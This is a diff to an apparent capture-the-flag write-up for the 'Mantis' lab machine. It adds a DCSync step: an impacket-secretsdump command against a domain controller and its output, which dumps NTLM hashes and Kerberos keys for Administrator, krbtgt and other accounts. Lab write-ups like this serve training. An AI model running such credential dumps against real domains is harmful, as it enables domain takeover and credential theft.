@@ -455,5 +455,30 @@ Exploit complete!
 
 ## DCSync
 ```python
+impacket-secretsdump -just-dc -no-pass MANTIS\$@10.129.17.20
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:22140219fd9432e584a355e54b28ecbb:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e330665e47f7890603b5a96bbb31e23:::
+htb.local\james:1103:aad3b435b51404eeaad3b435b51404ee:71b5ea0a10d569ffac56d3b63684b3d2:::
+MANTIS$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:c06d7bb2e780b417445f0f55c52399de2dbd206a383be45d407b376356cd9170
+Administrator:aes128-cts-hmac-sha1-96:ea5a1c528034eac55c6e97af85773352
+Administrator:des-cbc-md5:c2d65b4f7abab392
+krbtgt:aes256-cts-hmac-sha1-96:fb0175b25239486d1cee94e6fe7f2167017df916981c21ea0542d4460298d18e
+krbtgt:aes128-cts-hmac-sha1-96:ddbab1997d4bbd7a6c591f887b739c68
+krbtgt:des-cbc-md5:a113768326f10e1a
+htb.local\james:aes256-cts-hmac-sha1-96:a5b5099819f72a8b932c8cf10b643fc10fa98f6ef80397c196d3977210846e56
+htb.local\james:aes128-cts-hmac-sha1-96:762d8ec29ef72edb6690c52cfe6b91e3
+htb.local\james:des-cbc-md5:2085528ca7b67383
+MANTIS$:aes256-cts-hmac-sha1-96:7de75b8449af57628a8c5f128d4b94e670b6aeaeba37407590b5e0bd2fadd324
+MANTIS$:aes128-cts-hmac-sha1-96:c3a04c3550125dee0bec73669224a0bc
+MANTIS$:des-cbc-md5:252608c770c176cd
+[*] Cleaning up...
 ```
+Dumped all the hashes using a DCSync
+
